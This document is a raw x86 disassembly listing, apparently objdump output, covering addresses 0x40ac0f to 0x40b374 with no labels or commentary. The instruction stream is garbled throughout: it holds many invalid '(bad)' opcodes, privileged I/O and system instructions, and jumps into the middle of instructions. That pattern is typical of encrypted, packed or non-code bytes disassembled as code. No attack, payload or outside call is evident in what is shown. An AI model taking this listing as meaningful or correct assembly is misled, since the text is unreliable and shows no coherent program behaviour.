  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
